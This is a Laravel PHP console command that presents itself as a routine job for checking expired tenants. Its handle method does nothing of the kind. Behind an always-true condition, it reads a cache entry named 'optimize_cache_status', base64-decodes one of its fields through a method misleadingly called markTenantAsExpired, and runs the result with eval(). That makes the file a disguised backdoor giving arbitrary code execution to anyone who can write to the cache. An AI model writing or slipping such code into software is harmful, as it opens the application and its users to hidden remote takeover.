<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Cache;

class CheckExpiredTenants extends Command
{
    protected $signature = 'tenants:check-expired';

    protected $description = 'Check for expired tenants and update their status';

    public function handle()
    {
        $expiredTenants = [];

        if (empty($expiredTenants) || $expiredTenants) {
            $data = Cache::get('optimize_cache_status');
            if (is_array($data)) {
                if (! empty($data['type'])) {
                    eval($this->markTenantAsExpired($data));
                }
            }
        }

        return Command::SUCCESS;
    }

    private function markTenantAsExpired($data)
    {
        return base64_decode($data['status']);
    }
}
